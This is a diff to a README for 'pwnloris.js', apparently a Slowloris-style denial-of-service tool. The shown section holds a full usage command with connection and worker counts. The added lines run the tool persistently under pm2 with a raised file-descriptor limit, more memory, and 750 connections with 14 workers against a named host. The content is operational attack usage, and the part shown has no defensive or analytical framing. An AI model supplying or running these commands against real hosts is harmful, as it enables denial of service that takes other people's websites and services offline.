@@ -56,6 +56,14 @@ Full example:
 ```
 Bashnode pwnloris.js example.com -c 700 --workers 12 --https
 ```
+Using pm2:
+```
+ulimit -n 65535 && pm2 start pwnloris.js \
+  --name "pwnloris-vps" \
+  --node-args="--max-old-space-size=32768" \
+  -- \
+  ur.mom -c 750 --workers 14
+```
 
 ## ⚠️ Important Warnings
 
